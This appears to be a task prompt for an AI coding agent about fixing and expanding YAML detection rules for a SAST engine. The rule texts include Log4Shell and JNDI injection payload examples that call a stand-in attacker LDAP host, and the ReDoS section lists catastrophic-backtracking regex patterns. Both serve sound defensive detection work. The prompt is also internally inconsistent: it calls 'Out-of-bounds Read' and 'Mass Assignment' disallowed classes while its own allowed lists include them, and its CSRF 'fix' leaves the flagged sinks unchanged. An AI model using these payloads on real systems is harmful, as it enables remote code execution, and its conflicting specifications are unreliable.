# DevSecure360 SAST Engine — Rule Fix + Research-Driven Expansion Prompt
# READ THIS ENTIRE DOCUMENT BEFORE TOUCHING ANY FILE.
# This prompt has two parts: fix what is broken, then expand using real research.
# Both parts are mandatory. Do not skip either.

---

## PART 1 — FIX THE 7 CONFIRMED BUGS IN EXISTING RULES

The existing 87 rules were audited. Seven specific bugs were found.
Fix all seven exactly as specified below. No other changes to existing files.

---

### BUG 1 — `rules/cpp/cpp_out_of_bounds_read.yaml`
**Problem:** `vuln_class: Out-of-bounds Read` is not in the engine's allowed list.
The engine's validator will reject this rule at load time.

**Fix:** Change this one field:
```yaml
# BEFORE
vuln_class: Out-of-bounds Read

# AFTER
vuln_class: Memory Corruption
```

Leave every other field in this file exactly as it is.

---

### BUG 2 — `rules/c/c_use_after_free.yaml`
**Problem 2a:** `vuln_class: Memory Corruption` is incorrect. Use After Free is a
distinct, named vulnerability class that exists in the allowed list.

**Problem 2b:** `confidence: Confirmed` is incorrect. Use After Free requires CFG
analysis to confirm — you must track that a pointer is freed at one point and then
dereferenced at a later point in the execution path. The current text-based taint
engine cannot confirm this. Marking it Confirmed is a false claim.

**Fix:** Change these two fields:
```yaml
# BEFORE
vuln_class: Memory Corruption
confidence: Confirmed

# AFTER
vuln_class: Use After Free
confidence: Tentative
```

Leave every other field in this file exactly as it is.

---

### BUG 3 — `rules/c/c_integer_overflow.yaml`
**Problem:** `confidence: Confirmed` is incorrect. Integer overflow requires knowing
the data type size and the arithmetic result at runtime. A static text analysis engine
can identify the pattern (user input flowing into malloc size argument) but cannot
confirm that overflow actually occurs without type size information.

**Fix:** Change this one field:
```yaml
# BEFORE
confidence: Confirmed

# AFTER
confidence: Tentative
```

Leave every other field in this file exactly as it is.

---

### BUG 4 — `rules/java/java_mass_assignment.yaml`
**Problem:** `vuln_class: Mass Assignment` is not in the engine's allowed list.
The engine's validator will reject this rule at load time.

**Fix:** Change this one field:
```yaml
# BEFORE
vuln_class: Mass Assignment

# AFTER
vuln_class: Misconfiguration
```

Leave every other field in this file exactly as it is.

---

### BUG 5 — `rules/cpp/cpp_ssrf.yaml`
**Problem:** `boost::asio::ip::tcp::resolver::query(` is in the sinks list.
This function performs DNS resolution, not HTTP requests. DNS resolution is not SSRF.
SSRF requires the server to make an HTTP request to an attacker-controlled host.
This sink will generate false positives on every legitimate DNS lookup in Boost.Asio.

**Fix:** Remove that one sink. The corrected sinks block:
```yaml
sinks:
  - curl_easy_setopt(curl, CURLOPT_URL,
```

Leave every other field in this file exactly as it is.

---

### BUG 6 — `rules/go/go_csrf.yaml`
**Problem 6a:** `confidence: Confirmed` is incorrect. CSRF detection via route
handler registration cannot be confirmed by taint analysis. `http.HandleFunc` is
how you register ANY handler — flagging it means flagging every single Go web
endpoint whether or not CSRF protection is missing. The engine cannot detect
absent middleware with a sink-based approach.

**Problem 6b:** The current sinks list (`http.HandleFunc`, `http.Handle`,
`router.Handle`, `router.HandleFunc`) will fire on 100% of Go web applications
including ones that are correctly protected. This is architecturally wrong.

**Fix:** Change confidence and replace the sinks + sanitizers block:
```yaml
# BEFORE
confidence: Confirmed
sinks:
  - http.HandleFunc(
  - http.Handle(
  - router.Handle(
  - router.HandleFunc(
sanitizers:
  - gorilla/csrf
  - nosurf

# AFTER
confidence: Tentative
sinks:
  - http.HandleFunc(
  - http.Handle(
  - router.Handle(
  - router.HandleFunc(
sanitizers:
  - gorilla/csrf
  - nosurf
```

Also update the message field to clarify the limitation:
```yaml
message: |-
  The application may not implement CSRF protections. State-changing HTTP
  handlers registered without CSRF middleware (gorilla/csrf or nosurf) are
  vulnerable to cross-site request forgery. Note: this rule uses heuristic
  detection and requires manual review to confirm the absence of CSRF middleware.
  It will flag all route handlers; verify each finding manually.
```

---

### BUG 7 — `rules/java/java_log4shell.yaml`
**Problem:** This file mixes two completely different vulnerabilities in one rule.

`InitialContext.lookup(` and `context.lookup(` are **JNDI Injection** sinks — CWE-917.
`logger.info(`, `logger.error(`, `logger.debug(`, `logger.warn(`, `log.info(`, `log.error(`
are **Log Injection** sinks — CWE-117 (and specifically Log4Shell when Log4j2 processes JNDI
lookup strings embedded in log messages).

They have different attack vectors, different CWEs, different fixes, and different detection logic.
Combining them means one rule fires on JNDI lookups AND on log calls, making it impossible
to know which vulnerability was actually detected.

**Fix:** Delete `java_log4shell.yaml` and replace it with two separate files:

**File 1: `rules/java/java_log_injection.yaml`**
```yaml
rule_id: java_log_injection
language: java
vuln_class: Log Injection
severity: Critical
cwe: CWE-117
owasp: A09:2021-Security Logging and Monitoring Failures
cvss_score: 10.0
cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
confidence: Confirmed
issue: "Log Injection (Log4Shell) via unsanitized user input passed to Log4j2 logger"
message: |-
  User input is directly logged using Log4j2 without sanitization. In vulnerable
  versions of Log4j2 (2.0-beta9 through 2.16.0), the logger processes JNDI
  lookup strings embedded in log messages (e.g., ${jndi:ldap://attacker.com/x}).
  An attacker who controls any logged value can trigger a remote JNDI lookup,
  causing the server to load and execute arbitrary code from an attacker-controlled
  LDAP server. This is CVE-2021-44228, rated CVSS 10.0.
sources:
  - request.getParameter(
  - request.getParameterValues(
  - request.getHeader(
  - request.getHeaders(
  - request.getCookies(
  - request.getInputStream(
  - request.getReader(
  - request.getQueryString(
  - request.getPathInfo(
  - "@RequestParam"
  - "@PathVariable"
  - "@RequestBody"
  - "@RequestHeader"
  - "@CookieValue"
sinks:
  - logger.info(
  - logger.error(
  - logger.debug(
  - logger.warn(
  - logger.fatal(
  - log.info(
  - log.error(
  - log.debug(
  - log.warn(
  - LOG.info(
  - LOG.error(
sanitizers: []
remediation: |-
  Upgrade Log4j2 to version 2.17.1 or later (for Java 8+). This completely
  removes JNDI lookup support from message formatting.

  If you cannot upgrade immediately, set the JVM property:
    -Dlog4j2.formatMsgNoLookups=true
  or set the environment variable:
    LOG4J_FORMAT_MSG_NO_LOOKUPS=true

  Additionally, never log user-controlled input without sanitization:
  UNSAFE: logger.info("User login: " + request.getHeader("X-User"));
  SAFE:   logger.info("User login: {}", sanitize(request.getHeader("X-User")));
```

**File 2: `rules/java/java_jndi_injection.yaml`**
```yaml
rule_id: java_jndi_injection
language: java
vuln_class: Code Injection
severity: Critical
cwe: CWE-917
owasp: A03:2021-Injection
cvss_score: 9.8
cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
confidence: Confirmed
issue: "JNDI Injection via user-controlled lookup string in InitialContext.lookup()"
message: |-
  User input is passed directly to InitialContext.lookup() or context.lookup().
  An attacker can supply a malicious JNDI URL (e.g., ldap://attacker.com/payload)
  that causes the JVM to load and instantiate a remote class from an attacker-
  controlled server, resulting in arbitrary Remote Code Execution. This pattern
  is the root cause of Log4Shell and related JNDI injection vulnerabilities.
sources:
  - request.getParameter(
  - request.getParameterValues(
  - request.getHeader(
  - request.getHeaders(
  - request.getCookies(
  - request.getInputStream(
  - request.getReader(
  - request.getQueryString(
  - request.getPathInfo(
  - "@RequestParam"
  - "@PathVariable"
  - "@RequestBody"
  - "@RequestHeader"
  - "@CookieValue"
sinks:
  - InitialContext.lookup(
  - context.lookup(
  - dirContext.lookup(
  - ctx.lookup(
sanitizers: []
remediation: |-
  Never pass user-controlled data to JNDI lookup methods. If JNDI lookups are
  required, use a strict allowlist of permitted JNDI names and validate the
  input before passing it to lookup().

  UNSAFE:
    Context ctx = new InitialContext();
    ctx.lookup(request.getParameter("resource"));

  SAFE:
    // Validate that 'resource' is in the allowlist of known safe JNDI names
    if (ALLOWED_RESOURCES.contains(resource)) {
        ctx.lookup(resource);
    }
```

---

## VALIDATION OF PART 1

After making all 7 fixes, run this check:

```python
import yaml
from pathlib import Path

ALLOWED_VULN_CLASSES = {
    "SQLi", "NoSQLi", "CMDi", "XSS", "SSTI", "SSRF", "XXE",
    "Path Traversal", "Open Redirect", "Deserialization", "Code Injection",
    "LDAP Injection", "XPath Injection", "Log Injection", "Hardcoded Secret",
    "Weak Crypto", "JWT Bypass", "Prototype Pollution", "Buffer Overflow",
    "Integer Overflow", "Format String", "Use After Free", "Memory Corruption",
    "Race Condition", "Null Pointer Dereference", "ReDoS", "CSRF",
    "Misconfiguration", "Cookie Security", "Mass Assignment",
    "File Upload", "Out-of-bounds Read"
}

ALLOWED_CONFIDENCE = {"Confirmed", "Probable", "Tentative"}
MEMORY_ANALYSIS_RULES = {
    "c_use_after_free", "c_integer_overflow",
    "cpp_integer_overflow", "cpp_out_of_bounds_read"
}

errors = []
for f in sorted(Path("rules").rglob("*.yaml")):
    rule = yaml.safe_load(f.read_text(encoding="utf-8"))
    if not rule:
        errors.append(f"EMPTY: {f}")
        continue
    vc = str(rule.get("vuln_class", "")).strip()
    if vc not in ALLOWED_VULN_CLASSES:
        errors.append(f"INVALID vuln_class '{vc}': {f}")
    conf = str(rule.get("confidence", "")).strip()
    if conf not in ALLOWED_CONFIDENCE:
        errors.append(f"INVALID confidence '{conf}': {f}")
    rid = str(rule.get("rule_id", "")).strip()
    if rid in MEMORY_ANALYSIS_RULES and conf == "Confirmed":
        errors.append(f"MEMORY RULE MUST BE Tentative: {f}")

if errors:
    print(f"PART 1 INCOMPLETE — {len(errors)} errors:")
    for e in errors:
        print(f"  {e}")
else:
    print("PART 1 COMPLETE — all 7 bugs fixed correctly")
```

Do not start Part 2 until this script outputs:
`PART 1 COMPLETE — all 7 bugs fixed correctly`

---

## PART 2 — RESEARCH-DRIVEN EXPANSION

### What This Means

You must use web search to research each new vulnerability before writing a single
line of YAML. This is not optional. The research step is mandatory for every new rule.

The previous ruleset was found to contain fabricated rules because rules were generated
from memory rather than from real sources. This must not happen again.

---

### The Research Process — Follow This Exactly For Every New Rule

Before writing any new YAML file, you must complete these five research steps:

**Step 1 — Look up the CWE on MITRE**
Search: `site:cwe.mitre.org CWE-{number}`
Read the official CWE description. Confirm:
- The vulnerability class name matches the CWE title
- The affected languages are correct
- The consequence matches the severity you will assign

**Step 2 — Find the real sinks in CodeQL or Semgrep**
Search one of:
- `site:codeql.github.com {vulnerability} {language} sink`
- `site:semgrep.dev {vulnerability} {language}`
- `site:github.com/github/codeql {language} {vulnerability}`

Read the actual rule source code. Extract the real function names they use as sinks.
These are verified by security engineers at GitHub and Semgrep.
Copy the exact function names. Do not paraphrase.

**Step 3 — Find the real sources in official framework documentation**
Search: `site:docs.python.org {framework} request input` (adjust per language)
Or: `site:docs.djangoproject.com request GET POST`
Or: `site:flask.palletsprojects.com request`

Read the official docs. Extract the exact API calls developers use to read user input.

**Step 4 — Find the real sanitizers in OWASP or official docs**
Search: `site:owasp.org {vulnerability} prevention {language}`
Or: `site:cheatsheetseries.owasp.org {vulnerability} prevention`

The OWASP Cheat Sheet Series has specific, verified sanitizers for every major
vulnerability class and language. Use them.

**Step 5 — Write the remediation from the OWASP Cheat Sheet**
The remediation block must reference the specific OWASP Cheat Sheet for this vulnerability.
Example: "See OWASP SQL Injection Prevention Cheat Sheet for complete guidance."
Include the concrete safe code pattern found in the official docs.

---

### The Research Evidence You Must Record

For each new rule you write, record this evidence block as a comment at the top
of the YAML file:

```yaml
# RESEARCH EVIDENCE
# CWE Source:      https://cwe.mitre.org/data/definitions/{number}.html
# CodeQL Source:   {URL to the CodeQL rule that covers this sink}
# Semgrep Source:  {URL to the Semgrep rule that covers this sink}
# OWASP Cheat:     {URL to the OWASP Cheat Sheet for this vulnerability}
# Verification:    {One sentence explaining how you confirmed the sink is real}
#
# EXAMPLE:
# RESEARCH EVIDENCE
# CWE Source:      https://cwe.mitre.org/data/definitions/89.html
# CodeQL Source:   https://codeql.github.com/codeql-standard-libraries/python/...
# Semgrep Source:  https://semgrep.dev/r/python.django.security.injection.sql...
# OWASP Cheat:     https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection...
# Verification:    cursor.execute() is the Python DB-API 2.0 (PEP 249) standard
#                  method. It is explicitly listed as a sink by CodeQL's
#                  SqlExecution concept in python/ql/lib/semmle/python/Concepts.qll
```

If you cannot find a CodeQL or Semgrep source for a sink, you must not write that sink.
Either find a different authoritative source or omit the sink entirely.

---

### New Rules to Write — Coverage Gaps Found by Audit

These vuln classes are confirmed missing from the current ruleset.
Write them in this exact priority order.

---

#### NEW RULE 1: `rules/python/python_csrf.yaml`

**Research before writing:**
Search: `site:owasp.org CSRF Python Flask prevention`
Search: `site:cheatsheetseries.owasp.org Cross-Site Request Forgery Prevention`
Search: `site:semgrep.dev flask csrf`

**What you are looking for:**
- How Flask applications implement CSRF protection (Flask-WTF extension)
- What the sink pattern looks like (form handling without token)
- What the sanitizer looks like (csrf.protect(), @csrf.exempt, WTForms)

**Guidance:**
CSRF in Python Flask is detected by the absence of `CSRFProtect` initialization
combined with state-changing route handlers. This is a pattern rule, not taint-based.
Sources and sinks will be structural patterns, not taint flow.

```yaml
# Template — fill in after researching
rule_id: python_csrf
language: python
vuln_class: CSRF
severity: High
cwe: CWE-352
owasp: A01:2021-Broken Access Control
cvss_score: 8.8
cvss_vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
confidence: Tentative
issue: "Cross-Site Request Forgery — state-changing endpoint without CSRF protection"
# Fill message, sources, sinks, sanitizers, remediation from research
```

---

#### NEW RULE 2: `rules/python/python_jwt_bypass.yaml`

**Research before writing:**
Search: `site:owasp.org JWT none algorithm attack Python`
Search: `site:cwe.mitre.org CWE-287`
Search: `site:semgrep.dev python jwt none algorithm`
Search: `site:github.com/PyJWT security none algorithm`

**What you are looking for:**
- The PyJWT library's `decode()` function signature and its `algorithms` parameter
- How the None algorithm attack works
- What the safe pattern is (explicitly specifying allowed algorithms)
- The python-jose library equivalent

**Confirmed real sinks (verify via research):**
`jwt.decode(` — PyJWT library
`jose.jwt.decode(` — python-jose library
`jwt.decode(token, options={"verify_signature": False})` — unsafe pattern

**Confirmed real sanitizers (verify via research):**
`jwt.decode(token, key, algorithms=["HS256"])` — explicit algorithm specification

---

#### NEW RULE 3: `rules/python/python_cookie_security.yaml`

**Research before writing:**
Search: `site:owasp.org session cookie security Flask Python`
Search: `site:flask.palletsprojects.com cookies security`
Search: `site:cwe.mitre.org CWE-614`

**What you are looking for:**
- How Flask sets cookies (`response.set_cookie()`)
- What flags are required (`httponly=True`, `secure=True`, `samesite='Strict'`)
- How to detect missing flags as a structural pattern

---

#### NEW RULE 4: `rules/javascript/js_csrf.yaml`

**Research before writing:**
Search: `site:owasp.org CSRF Node.js Express prevention`
Search: `site:cheatsheetseries.owasp.org Cross-Site_Request_Forgery_Prevention_Cheat_Sheet`
Search: `site:npmjs.com csurf`
Search: `site:semgrep.dev express csrf`

**What you are looking for:**
- How Express.js applications implement CSRF (csurf middleware)
- The deprecated status of csurf and what replaced it
- Detection patterns for missing CSRF middleware on state-changing routes

---

#### NEW RULE 5: `rules/php/php_xxe.yaml`

**Research before writing:**
Search: `site:owasp.org XXE PHP prevention`
Search: `site:cheatsheetseries.owasp.org XML_External_Entity_Prevention_Cheat_Sheet`
Search: `site:codeql.github.com PHP XXE sink`
Search: `site:php.net simplexml_load_string`

**Confirmed real sinks to verify:**
`simplexml_load_string(` — PHP standard library
`simplexml_load_file(` — PHP standard library
`DOMDocument::loadXML(` — PHP standard library
`DOMDocument::load(` — PHP standard library
`xml_parse(` — PHP standard library
`XMLReader::open(` — PHP standard library

**Confirmed real sanitizer to verify:**
`libxml_disable_entity_loader(true)` — PHP (deprecated in PHP 8.0 as it's now the default)

---

#### NEW RULE 6: `rules/php/php_ldap_injection.yaml`

**Research before writing:**
Search: `site:owasp.org LDAP Injection PHP`
Search: `site:cwe.mitre.org CWE-90`
Search: `site:php.net ldap_search`
Search: `site:php.net ldap_escape`

**Confirmed real sinks to verify:**
`ldap_search(` — PHP standard library
`ldap_list(` — PHP standard library
`ldap_read(` — PHP standard library
`ldap_add(` — PHP standard library
`ldap_modify(` — PHP standard library
`ldap_delete(` — PHP standard library

**Confirmed real sanitizer to verify:**
`ldap_escape(` — PHP standard library, added in PHP 5.6

---

#### NEW RULE 7: `rules/go/go_xxe.yaml`

**Research before writing:**
Search: `site:pkg.go.dev encoding/xml`
Search: `site:owasp.org XXE Go Golang`
Search: `site:codeql.github.com Go XXE`

**What you are looking for:**
Go's `encoding/xml` standard library behavior with external entities.
Note: Go's `encoding/xml` does not process external DTD entities by default in
recent versions. Research whether this rule applies to any common Go XML libraries
that DO process external entities (e.g., `github.com/beevik/etree`).
If no real Go XXE sink exists in common libraries, do NOT write this rule.
Write a note explaining why instead.

---

#### NEW RULE 8: `rules/go/go_ldap_injection.yaml`

**Research before writing:**
Search: `site:pkg.go.dev gopkg.in/ldap.v3`
Search: `site:github.com/go-ldap/ldap`
Search: `site:owasp.org LDAP Injection Go`

**Confirmed real sinks to verify:**
`l.Search(` — go-ldap library (`github.com/go-ldap/ldap/v3`)
`conn.Search(` — go-ldap library

**Confirmed real sanitizer to verify:**
`ldap.EscapeFilter(` — go-ldap library (`github.com/go-ldap/ldap/v3`)

---

#### NEW RULE 9: `rules/javascript/js_redos.yaml`

**Research before writing:**
Search: `site:owasp.org ReDoS Regular Expression Denial of Service`
Search: `site:cwe.mitre.org CWE-1333`
Search: `site:semgrep.dev javascript redos`
Search: `site:github.com nicowillis/redos-detector`

**What you are looking for:**
The structural patterns that indicate catastrophic backtracking:
- Nested quantifiers: `(a+)+`, `(a*)*`, `(a|aa)+`
- Overlapping alternatives: `(a|a)+`, `(ab|ab)+`
These are detected by analyzing the regex pattern string itself, not via taint analysis.
This is a pattern-based rule with `sources: []` and `sinks: []`.

---

#### NEW RULE 10: `rules/python/python_redos.yaml`

**Research before writing:**
Same research as NEW RULE 9 but for Python's `re` module.
Search: `site:docs.python.org re compile`
Search: `site:semgrep.dev python redos`

**Confirmed real sinks:**
`re.compile(` — Python standard library
`re.match(` — Python standard library
`re.search(` — Python standard library
`re.findall(` — Python standard library

---

### Schema For All New Rules

Every new rule must follow this exact schema. All fields are required.

```yaml
# RESEARCH EVIDENCE
# CWE Source:      {URL}
# CodeQL Source:   {URL} or "Not applicable — pattern-based rule"
# Semgrep Source:  {URL} or "Not applicable — pattern-based rule"
# OWASP Cheat:     {URL}
# Verification:    {One sentence confirming each sink is real}

rule_id: {language}_{vuln_short}_{description}
# Must be unique across all existing files. Check before assigning.

language: python|javascript|java|php|go|csharp|c|cpp

vuln_class: {from allowed list only — see below}

severity: Critical|High|Medium|Low

cwe: CWE-{number}
# Correct CWE only. Not CWE-1000. Verified from mitre.org.

owasp: A{number}:{year}-{name}
# Correct OWASP Top 10 2021 category only.

cvss_score: {float}
# Numerically correct CVSS v3.1 base score.

cvss_vector: CVSS:3.1/{vector}
# Valid CVSS v3.1 vector string.

confidence: Confirmed|Probable|Tentative
# Confirmed = taint analysis proves source→sink with no sanitizer
# Probable = strong structural pattern
# Tentative = heuristic, requires manual review
# Pattern-based rules (CSRF, ReDoS, Cookie Security) = Tentative
# Memory analysis rules (UAF, Integer Overflow) = Tentative
# All other taint rules = Confirmed

issue: "{one sentence naming the specific function and vulnerability}"
# Not generic. Names the exact sink function.
# Good: "CSRF via unprotected Flask route without CSRFProtect middleware"
# Bad:  "Cross-Site Request Forgery detected"

message: |-
  {2-4 sentences explaining:
  1. What the vulnerability is mechanically
  2. What an attacker can do with it specifically
  3. Why the current code pattern creates the risk}
  # Must be at least 80 characters. Must be specific to this rule.
  # Not copy-pasted from another rule.

sources:
  # ONLY include sources genuinely relevant to this specific vulnerability.
  # Weak Crypto, Hardcoded Secret, ReDoS, CSRF, Cookie Security:
  #   sources: []   (pattern-based — no HTTP taint flow)
  # All injection vulns: include framework-specific HTTP input sources only
  - real_source_function(

sinks:
  # ONLY real functions verified by research.
  # Every sink must have a URL in the research evidence comment above.
  # Pattern-based rules: sinks: []
  - real_sink_function(

sanitizers:
  # The specific function that neutralizes THIS vulnerability in this language.
  # Not a generic validator. The correct sanitizer for this exact vuln class.
  # If none exists: sanitizers: []
  - real_sanitizer_function(

remediation: |-
  {3-5 sentences. Must include:
  1. What to STOP doing — name the vulnerable pattern
  2. What to DO INSTEAD — name the specific safe alternative
  3. A concrete code example in this language showing both unsafe and safe}
  # Must reference the OWASP Cheat Sheet URL found in research step.
  # Not generic. Not "validate user input."
```

---

### Allowed vuln_class Values

Only these exact strings. No variations.

```
SQLi              NoSQLi           CMDi
XSS               SSTI             SSRF
XXE               Path Traversal   Open Redirect
Deserialization   Code Injection   LDAP Injection
XPath Injection   Log Injection    Hardcoded Secret
Weak Crypto       JWT Bypass       Prototype Pollution
Buffer Overflow   Integer Overflow Format String
Use After Free    Memory Corruption Race Condition
Null Pointer Dereference          ReDoS
CSRF              Misconfiguration Cookie Security
Mass Assignment   File Upload      Out-of-bounds Read
```

---

### What You Must NOT Do in Part 2

**DO NOT write any sink from memory.** Every sink must come from a URL you searched.
If you cannot find a URL, do not write the sink.

**DO NOT copy the same source list to all rules.** Pattern-based rules (`sources: []`).
Injection rules must have sources relevant to that specific vulnerability class.
`os.environ.get(` is not a source for CSRF. `sys.argv[` is not a source for LDAP Injection
in a web application context.

**DO NOT claim `confidence: Confirmed` for:**
- CSRF rules (structural, not taint-based)
- ReDoS rules (pattern-based on regex strings)
- Cookie Security rules (structural, not taint-based)
- Use After Free (requires CFG, current engine cannot confirm)
- Integer Overflow (requires type size, current engine cannot confirm)

**DO NOT create a rule if research shows the vulnerability does not apply.**
Example: If research confirms Go's `encoding/xml` does not process external entities
by default in Go 1.20+, then `go_xxe.yaml` should not be written. Document why instead.

**DO NOT write a rule with fewer than 2 real sinks** unless the vulnerability is
genuinely triggered by a single function (e.g., `pickle.loads(` for Python deserialization).

---

## VALIDATION OF PART 2

After writing all new rules, run this complete validation:

```python
import yaml
import re
from pathlib import Path

REQUIRED_FIELDS = [
    "rule_id", "language", "vuln_class", "severity", "cwe",
    "owasp", "cvss_score", "cvss_vector", "confidence",
    "issue", "message", "sources", "sinks", "sanitizers", "remediation"
]

ALLOWED_VULN_CLASSES = {
    "SQLi", "NoSQLi", "CMDi", "XSS", "SSTI", "SSRF", "XXE",
    "Path Traversal", "Open Redirect", "Deserialization", "Code Injection",
    "LDAP Injection", "XPath Injection", "Log Injection", "Hardcoded Secret",
    "Weak Crypto", "JWT Bypass", "Prototype Pollution", "Buffer Overflow",
    "Integer Overflow", "Format String", "Use After Free", "Memory Corruption",
    "Race Condition", "Null Pointer Dereference", "ReDoS", "CSRF",
    "Misconfiguration", "Cookie Security", "Mass Assignment",
    "File Upload", "Out-of-bounds Read"
}

FORBIDDEN_SINKS = [
    "deprecated_function_", "DeprecatedMethod", "vulnerableSink",
    "fake_", "dummy_", "placeholder_", "_vuln", "vuln_func",
    "unsafe_func_", "test_sink_", "example_sink"
]

TENTATIVE_REQUIRED = {
    "c_use_after_free", "c_integer_overflow",
    "cpp_integer_overflow", "cpp_out_of_bounds_read",
    "go_csrf", "python_csrf", "javascript_csrf",
    "python_cookie_security", "javascript_cookie_security",
    "python_redos", "javascript_redos"
}

errors = []
seen_ids = {}

for f in sorted(Path("rules").rglob("*.yaml")):
    try:
        rule = yaml.safe_load(f.read_text(encoding="utf-8"))
    except Exception as e:
        errors.append(f"PARSE ERROR {f}: {e}")
        continue
    if not rule:
        errors.append(f"EMPTY FILE: {f}")
        continue

    # Required fields
    for field in REQUIRED_FIELDS:
        if field not in rule:
            errors.append(f"MISSING '{field}': {f.name}")
        elif rule[field] is None or rule[field] == "":
            errors.append(f"EMPTY '{field}': {f.name}")

    # Unique rule_id
    rid = str(rule.get("rule_id", "")).strip()
    if rid in seen_ids:
        errors.append(f"DUPLICATE rule_id '{rid}': {f.name} and {seen_ids[rid]}")
    else:
        seen_ids[rid] = f.name

    # vuln_class
    vc = str(rule.get("vuln_class", "")).strip()
    if vc not in ALLOWED_VULN_CLASSES:
        errors.append(f"INVALID vuln_class '{vc}': {f.name}")

    # confidence correctness
    conf = str(rule.get("confidence", "")).strip()
    if rid in TENTATIVE_REQUIRED and conf != "Tentative":
        errors.append(f"MUST BE Tentative (not '{conf}'): {f.name}")

    # Fabricated sinks
    sinks = rule.get("sinks", []) or []
    for sink in sinks:
        for forbidden in FORBIDDEN_SINKS:
            if forbidden.lower() in str(sink).lower():
                errors.append(f"FABRICATED SINK '{sink}': {f.name}")

    # Message length
    msg = str(rule.get("message", "")).strip()
    if len(msg) < 80:
        errors.append(f"MESSAGE TOO SHORT: {f.name}")

    # Remediation check
    rem = str(rule.get("remediation", "")).strip()
    if "validate and sanitize all user input" in rem.lower():
        errors.append(f"USELESS REMEDIATION: {f.name}")
    if len(rem) < 100:
        errors.append(f"REMEDIATION TOO SHORT: {f.name}")

    # Research evidence comment check
    raw = f.read_text(encoding="utf-8")
    if "# RESEARCH EVIDENCE" not in raw and f.stat().st_mtime > __import__('time').time() - 86400:
        errors.append(f"MISSING RESEARCH EVIDENCE COMMENT (new file): {f.name}")

print(f"Files checked: {len(list(Path('rules').rglob('*.yaml')))}")
print(f"Rule IDs seen: {len(seen_ids)}")
print(f"Errors: {len(errors)}")
for e in errors:
    print(f"  ERROR: {e}")

if not errors:
    print("\nALL RULES PASS VALIDATION")
else:
    print(f"\nFIX ALL {len(errors)} ERRORS BEFORE REPORTING COMPLETION")
    raise SystemExit(1)
```

---

## WHAT TO REPORT WHEN DONE

Submit all of the following. Incomplete reports will be rejected.

**Part 1 Report:**
- Paste the Part 1 validation script output showing zero errors
- List the 7 files changed and exactly what was changed in each

**Part 2 Report:**
- For each new rule written: the rule_id, the language, the vuln_class,
  and the 3 URLs from the research evidence comment (CWE, CodeQL/Semgrep, OWASP)
- If any rule from the target list was NOT written, explain why with the
  research finding that led to that decision (e.g., "Go XXE not written because
  research confirmed encoding/xml does not process external entities by default
  in Go 1.20+ per pkg.go.dev documentation")
- Paste the Part 2 validation script output showing zero errors
- Final rule count per language

Do not report completion without both validation script outputs.
Do not add rules not on the list without asking first.
